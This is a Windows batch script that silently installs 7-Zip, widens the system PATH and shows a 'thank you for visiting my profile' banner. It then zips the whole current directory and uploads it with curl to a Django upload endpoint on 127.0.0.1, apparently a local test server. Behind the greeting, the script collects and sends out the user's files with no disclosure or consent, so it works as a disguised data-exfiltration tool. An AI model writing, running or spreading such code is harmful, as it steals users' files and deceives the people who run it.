@echo off
setlocal

:: Define variables for 7-Zip installation
set download_url=https://www.7-zip.org/a/7z2301-x64.exe
set installer_name=7z2301-x64.exe
set install_dir="C:\Program Files\7-Zip"
set temp_dir=%TEMP%

:: Change directory to the temporary directory
cd %temp_dir%

:: Check if 7-Zip is installed
where 7z >nul 2>&1
if errorlevel 1 (
    echo 7-Zip is not installed. Installing 7-Zip...

    :: Download the 7-Zip installer
    powershell -Command "Invoke-WebRequest -Uri %download_url% -OutFile %temp_dir%\%installer_name%"

    :: Check if the installer was downloaded
    if not exist %installer_name% (
        echo Failed to download 7-Zip installer.
        exit /b 1
    )

    :: Install 7-Zip silently
    %temp_dir%\%installer_name% /S

    :: Check if installation was successful
    if not exist %install_dir%\7z.exe (
        echo Failed to install 7-Zip.
        exit /b 1
    )

    echo 7-Zip installed successfully.

    :: Add 7-Zip to the system PATH environment variable
    setx PATH "%PATH%;%install_dir%" /M

    :: Cleanup
    del %temp_dir%\%installer_name%
) else (
    echo 7-Zip is already installed.
)

:: Define banner
echo ********************************************************************************
echo *                                                                              *
echo *                       THANK YOU FOR VISITING MY PROFILE!                      *
echo *                                                                              *
echo ********************************************************************************
echo.

:: Get the current directory name
for %%d in ("%cd%") do set current_dir_name=%%~nxd

:: Define the name of the output zip file
set zip_file_name=%current_dir_name%.zip

:: Create the zip file using 7-Zip
7z a %zip_file_name% * >nul

:: Check if the zip file was created successfully
if exist %zip_file_name% (
    echo Successfully created zip file: %zip_file_name%
) else (
    echo Failed to create zip file.
    exit /b 1
)

:: Define URLs for CSRF and file upload
set CSRF_URL=http://127.0.0.1:8000/uploader/get-csrf-token/
set UPLOAD_URL=http://127.0.0.1:8000/uploader/upload/

:: Set the path to the ZIP file (created earlier)
set ZIP_FILE_PATH=%zip_file_name%

:: Check if the zip file exists
if not exist "%ZIP_FILE_PATH%" (
    echo File not found: %ZIP_FILE_PATH%
    exit /b 1
)

:: Get CSRF token from the Django site using curl and save cookies
curl -s -c cookies.txt %CSRF_URL% > csrf_response.json

:: Check if the response file is empty
if not exist csrf_response.json (
    echo Failed to retrieve CSRF token.
    exit /b 1
)

:: Extract the CSRF token from the JSON response
for /f "tokens=2 delims=:," %%a in (csrf_response.json) do set csrf_token=%%~a
set csrf_token=%csrf_token:~1,-1%

:: Check if csrf_token is empty
if "%csrf_token%"=="" (
    echo Failed to retrieve CSRF token.
    exit /b 1
)

echo CSRF token retrieved: %csrf_token%

:: Upload the ZIP file using curl with the CSRF token
curl -s -b cookies.txt -c cookies.txt -F "file=@%ZIP_FILE_PATH%" -F "csrfmiddlewaretoken=%csrf_token%" %UPLOAD_URL% > response.txt

:: Check for success or failure
findstr /c:"HTTP/1.1 200 OK" response.txt >nul
if %errorlevel% equ 0 (
    echo Zip file uploaded successfully!
) else (
    echo Failed to upload zip file.
    echo Response:
    type response.txt
)

:: Cleanup temporary files
del cookies.txt
del csrf_response.json
del response.txt

echo Process completed.
pause
exit /b 0
